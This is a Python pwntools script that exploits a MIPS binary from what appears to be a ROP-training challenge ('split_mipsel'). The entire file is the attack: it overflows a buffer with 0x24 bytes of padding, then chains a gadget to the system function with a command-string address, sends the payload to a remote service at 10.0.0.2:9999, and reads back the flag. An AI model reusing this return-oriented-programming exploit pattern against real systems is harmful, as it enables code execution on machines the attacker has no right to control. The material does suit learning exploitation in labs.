from pwn import *
import re
import fcntl
import termios

BINARY = "./split_mipsel"
ELF = ELF(BINARY)

context.os = "linux"
context.arch = "mips"
context.binary = BINARY
DEBUG = False
if len(sys.argv) > 1:
    DEBUG = True

rop = b"A" * 0x24
rop += p32(0x00400A20)
rop += b"B" * 4
rop += p32(ELF.symbols["system"])
rop += p32(0x00411010)


p = remote("10.0.0.2", 9999)
p.recv()
p.sendline(rop)

print(p.recvline_contains(b"ROPE"))